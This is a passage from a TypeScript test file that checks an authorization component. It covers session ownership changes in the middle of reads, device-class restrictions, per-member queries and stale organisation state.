    expect(await call(phone, 'endpoint.listings', {})).toBe('ok');
    expect(await call(phone, 'session.status', { appSessionId: 'app-b' })).toBe('class');
    expect(await subscribe(phone, { lane: 'B', id: 'app-b' }, 'cards')).toBe('ok');
    expect(await subscribe(phone, { lane: 'B', id: 'app-b' }, 'full')).toBe('class');
    expect(await subscribe(phone, { lane: 'B', id: 'app-shared' }, 'cards')).toBe('class');
  });
});

describe('the decision without a channel', () => {
  /** An authorizer over a fixed head, for what a channel can't show directly. */
  type Unit = {
    authorizer: Authorizer;
    ref: string;
    /** The head the authorizer reads, and the next one: the machine's owners moved from A to B. */
    heads: { s2: OrgState; s3: OrgState };
    setHead(head: OrgState): void;
    records: Map<string, SessionRecord>;
    changed(target: SessionTarget): void;
  };

  async function authorizer(options: { tooOld?: boolean; dispatch?: AuthorizeContext['dispatch'] } = {}): Promise<Unit> {
    const ref = 'R'.repeat(22);
    const key = await generateSigningKey();
    const s1 = await genesis(ORG, A, a1, recovery);
    const s2 = await successor(s1, [a1], (s) => {
      s.members.push({ id: B, email: 'b@example.com', role: 'member', devices: [b1.device] });
      s.machines.push({ name: 'mini', ref, pub: key.pub, owners: [A] });
      s.machineNames.push({ name: 'mini', ref });
    });
    const s3 = await successor(s2, [a1], (s) => void (s.machines[0].owners = [B]));
    let head = s2.state;
    const records = new Map(RECORDS.map((r) => [`${r.lane}:${r.session}`, r]));
    const listeners = new Set<(t: SessionTarget) => void>();
    const ctx: AuthorizeContext = {
      ref: () => ref,
      org: () => ({ head, certificates: NO_CERTIFICATES, tooOld: options.tooOld === true }),
      rights: async (member) => (member === A ? ['spawn', 'shell', 'machine-admin'] : []),
      policy: () => ({ read_only: false, ceiling: 'settings' }),
      settingsMode: () => 'default',
      records: {
        record: (t) => records.get(`${t.lane}:${t.session}`) ?? null,
        onChange: (listener) => {
          listeners.add(listener);
          return () => listeners.delete(listener);
        },
      },
      checkouts: { known: () => true },
      dispatch: options.dispatch ?? engineHost([]),
      webauthn: { origin: () => HUB, counter: () => 0, setCounter: () => {} },
    };
    return {
      authorizer: new Authorizer(ctx),
      ref,
      heads: { s2: s2.state, s3: s3.state },
      setHead: (next) => void (head = next),
      records,
      changed: (t) => listeners.forEach((listener) => listener(t)),
    };
  }

  /** A dispatch whose first `read` (`session.status` unless named) waits until the test lets it go, saying when it is reached. */
  function suspended(read = 'session.status'): { dispatch: AuthorizeContext['dispatch']; reached: Promise<void>; release(): void; reads: () => number } {
    const host = engineHost([]);
    let reached!: () => void;
    let release!: () => void;
    const at = new Promise<void>((resolve) => (reached = resolve));
    const gate = new Promise<void>((resolve) => (release = resolve));
    let reads = 0;
    return {
      dispatch: async (owner, name, input) => {
        if (name === read && reads++ === 0) {
          reached();
          await gate;
        }
        return host(owner, name, input);
      },
      reached: at,
      release: () => release(),
      reads: () => reads,
    };
  }

  const whoA = { member: A, device: 'a1', clientClass: 'native-mac' as const };
  const whoB = { member: B, device: 'b1', clientClass: 'native-mac' as const };

  function sendOn(ref: string, appSessionId: string, content: string, device: TestDevice = a1, member = A) {
    const d = new Device({ identity: { org: ORG, member, device: device.device.id, clientClass: 'native-mac', channelKey: device.channel, build: 'x', capabilities: [] }, org: memoryOrgView({ chain: [{} as SignedOrgState] }) });
    const action = d.action({ machine: ref, action: 'session.send', session: appSessionId, context: { lane: 'B', launchId: 'launch-1', engineSessionId: ENGINE[appSessionId] }, args: { appSessionId, content } });
    return { kind: 'act' as const, name: action.action, input: action.args, action };
  }

  it('decides again when the head moves under its reads: ownership taken away mid-read is `grade`', async () => {
    const host = suspended();
    const unit = await authorizer({ dispatch: host.dispatch });
    const deciding = unit.authorizer.authorize(sendOn(unit.ref, 'app-own', '/clear'), whoA, Date.now());
    await host.reached;
    unit.setHead(unit.heads.s3);
    host.release();
    expect(await deciding).toEqual({ ok: false, reason: 'grade' });
    // Unmoved, the same request passes.
    const fresh = await authorizer();
    expect((await fresh.authorizer.authorize(sendOn(fresh.ref, 'app-own', '/clear'), whoA, Date.now())).ok).toBe(true);
  });

  it('decides again when the target’s record changes under its reads: a share withdrawn mid-read is `grade`', async () => {
    // The record is read after the session's status; the answer's pending request is read after the record.
    const host = suspended('session.pendingRequest');
    const unit = await authorizer({ dispatch: host.dispatch });
    const answer = (ref: string) => {
      const d = new Device({ identity: { org: ORG, member: B, device: 'b1', clientClass: 'native-mac', channelKey: b1.channel, build: 'x', capabilities: [] }, org: memoryOrgView({ chain: [{} as SignedOrgState] }) });
      const action = d.action({ machine: ref, action: 'session.answer', session: 'app-shared', context: { lane: 'B', launchId: 'launch-1', engineSessionId: 'eng-shared' }, args: { appSessionId: 'app-shared', requestId: 'rq-question', answer: { kind: 'question', answers: { 'Which?': 'A' } } } });
      return { kind: 'act' as const, name: action.action, input: action.args, action };
    };
    const deciding = unit.authorizer.authorize(answer(unit.ref), whoB, Date.now());
    await host.reached;
    unit.records.set('B:eng-shared', { lane: 'B', session: 'eng-shared', owners: [A] });
    unit.changed({ lane: 'B', session: 'eng-shared', appSessionId: 'app-shared' });
    host.release();
    expect(await deciding).toEqual({ ok: false, reason: 'grade' });
  });

  it('gives up `unavailable` when the head keeps moving under its reads', async () => {
    let flips = 0;
    const unit: Unit = await authorizer({
      dispatch: async (owner, name, input) => {
        // Every read of the session's status sees a new head adopted while it ran.
        if (name === 'session.status') unit.setHead(++flips % 2 === 1 ? unit.heads.s3 : unit.heads.s2);
        return engineHost([])(owner, name, input);
      },
    });
    expect(await unit.authorizer.authorize(sendOn(unit.ref, 'app-own', 'hello'), whoA, Date.now())).toEqual({ ok: false, reason: 'unavailable' });
  });

  it('answers a web-cards device’s query only for what its class may do, on a session its member owns', async () => {
    const { authorizer: authz } = await authorizer();
    const phone = { member: B, device: 'bw', clientClass: 'web-cards' as const };
    const own: SessionTarget = { lane: 'B', session: 'eng-b', appSessionId: 'app-b' };
    const shared: SessionTarget = { lane: 'B', session: 'eng-shared', appSessionId: 'app-shared' };
    const query = (name: string, target: SessionTarget | null) => ({ kind: 'query' as const, name, input: { member: B, target } });
    expect(await authz.authorize(query('session.answer', own), phone, Date.now())).toEqual({ ok: true, target: own });
    expect(await authz.authorize(query('sminos.decide', { lane: 'A', session: 'la-b' }), phone, Date.now())).toEqual({ ok: true, target: { lane: 'A', session: 'la-b' } });
    // Its member's native operations: a queued message's edit on a session only shared with them, a send, a spawn.
    expect(await authz.authorize(query('session.queue.edit', shared), phone, Date.now())).toEqual({ ok: false, reason: 'class' });
    expect(await authz.authorize(query('session.send', own), phone, Date.now())).toEqual({ ok: false, reason: 'class' });
    expect(await authz.authorize(query('session.answer', shared), phone, Date.now())).toEqual({ ok: false, reason: 'class' });
    expect(await authz.authorize(query('sminos.spawn', null), phone, Date.now())).toEqual({ ok: false, reason: 'class' });
    // The member's native device may.
    expect((await authz.authorize(query('session.queue.edit', shared), whoB, Date.now())).ok).toBe(true);
  });

  it('answers a query only to the operation’s own member, while they hold view on its target', async () => {
    const { authorizer: authz } = await authorizer();
    const now = Date.now();
    const target: SessionTarget = { lane: 'A', session: 'la-converse' };
    const query = (member: string, on: SessionTarget | null, name = 'sminos.steer') => ({ kind: 'query' as const, name, input: { member, target: on } });
    expect(await authz.authorize(query(B, target), { member: B, device: 'b1', clientClass: 'native-mac' }, now)).toEqual({ ok: true, target });
    expect(await authz.authorize(query(B, target), { member: A, device: 'a1', clientClass: 'native-mac' }, now)).toEqual({ ok: false, reason: 'grade' });
    expect(await authz.authorize(query(B, { lane: 'B', session: 'eng-private', appSessionId: 'app-private' }), { member: B, device: 'b1', clientClass: 'native-mac' }, now)).toEqual({ ok: false, reason: 'grade' });
    // A spawn's target is the machine: its member's spawn right.
    expect((await authz.authorize(query(A, null, 'sminos.spawn'), { member: A, device: 'a1', clientClass: 'native-mac' }, now)).ok).toBe(true);
    expect(await authz.authorize(query(B, null, 'sminos.spawn'), { member: B, device: 'b1', clientClass: 'native-mac' }, now)).toEqual({ ok: false, reason: 'grade' });
  });

  it('stops every action but a delivered state once the head is too old (`state-too-old`), and serves reads', async () => {
    const { authorizer: authz, ref } = await authorizer({ tooOld: true });
    const now = Date.now();
    const a = new Device({ identity: { org: ORG, member: A, device: 'a1', clientClass: 'native-mac', channelKey: a1.channel, build: 'x', capabilities: [] }, org: memoryOrgView({ chain: [await genesis(ORG, A, a1, recovery)] }) });
    const steer = a.action({ machine: ref, action: 'sminos.steer', session: 'la-converse', context: { lane: 'A', session: 'la-converse', launch: 'L1' }, args: { session: 'la-converse', text: 'x' } });
    const who = { member: A, device: 'a1', clientClass: 'native-mac' as const };
    expect(await authz.authorize({ kind: 'act', name: steer.action, input: steer.args, action: steer }, who, now)).toEqual({ ok: false, reason: 'state-too-old' });
    const state = a.action({ machine: ref, action: 'endpoint.state', args: { states: [], transitions: [] } });
    expect((await authz.authorize({ kind: 'act', name: state.action, input: state.args, action: state }, who, now)).ok).toBe(true);
    expect((await authz.authorize({ kind: 'call', name: 'sminos.rows', input: { session: 'la-converse' } }, who, now)).ok).toBe(true);
  });
});
